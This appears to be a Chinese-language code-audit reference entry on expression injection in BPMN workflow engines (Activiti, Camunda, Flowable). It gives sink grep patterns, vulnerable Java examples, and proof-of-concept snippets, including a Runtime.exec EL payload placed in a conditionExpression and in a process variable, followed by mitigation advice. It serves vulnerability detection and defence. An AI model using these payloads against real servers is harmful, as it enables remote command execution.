# 工作流引擎注入

## 目录

| 子模式 | Sink点API | 严重度 |
|--------|----------|--------|
| AP3504.001 BPMN工作流注入 | `ProcessEngine.getRuntimeService().startProcessInstanceByKey()`, `runtimeService.trigger()`, `conditionExpression` | 高 |

---

## AP3504.001 BPMN工作流注入

### Sink点

**Sink点Grep模式**:
```
ProcessEngine.getRuntimeService
RuntimeService.startProcessInstanceByKey
runtimeService.trigger
runtimeService.setVariable
conditionExpression
elExpression
org.activiti.engine
org.camunda.bpm
org.flowable.engine
```

**LSP回溯示例**:
```java
// Sink点: 流程变量用户可控
RuntimeService runtimeService = processEngine.getRuntimeService();
Map<String, Object> variables = new HashMap<>();
variables.put("exec", userInput);  // ← 用户可控变量
ProcessInstance instance = runtimeService.startProcessInstanceByKey(
    "processKey",
    variables  // ← Sink点
);

// Sink点: 条件表达式用户可控
taskService.complete(taskId, variables);
runtimeService.trigger(processInstanceId, variables);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `ProcessEngine`, `RuntimeService`, `startProcessInstanceByKey`, `trigger`, `conditionExpression`

**危险模式**:
```java
// 危险: 流程变量用户可控
Map<String, Object> vars = new HashMap<>();
vars.put("exec", userInput);  // 用户可控
runtimeService.startProcessInstanceByKey("process", vars);

// 危险: BPMN条件表达式用户可控
<activiti:executionListener event="start">
  <activiti:flowable-expression>
    ${userInput}  <!-- 用户输入作为表达式 -->
  </activiti:flowable-expression>
</activiti:executionListener>
```

### POC关键片段

```xml
<!-- BPMN 条件表达式注入 -->
<bpmn:conditionExpression>
  <![CDATA[${T(java.lang.Runtime).getRuntime().exec('id')}]]>
</bpmn:conditionExpression>

<!-- BPMN 监听器注入 -->
<bpmn:executionListener class="flowable.delegate" expression="${userExpression}"/>

<!-- BPMN 服务任务注入 -->
<bpmn:serviceTask>
  <bpmn:flowable:expression>#{userInput}</bpmn:flowable:expression>
</bpmn:serviceTask>
```

```java
// Java API 注入
Map<String, Object> vars = new HashMap<>();
vars.put("exec", "T(java.lang.Runtime).getRuntime().exec('id')");
runtimeService.startProcessInstanceByKey("process", vars);

// BPMN脚本任务注入
runtimeService.setVariable(processInstanceId, "script", userInput);
```

### 防护建议
- 流程定义文件存储在安全位置，用户不可直接修改
- 使用白名单验证流程变量内容
- 禁用BPMN中的动态表达式解析
- 升级Activiti/Camunda/Flowable到最新版本
- 配置流程引擎的安全策略
- 避免在流程变量中使用用户输入的脚本内容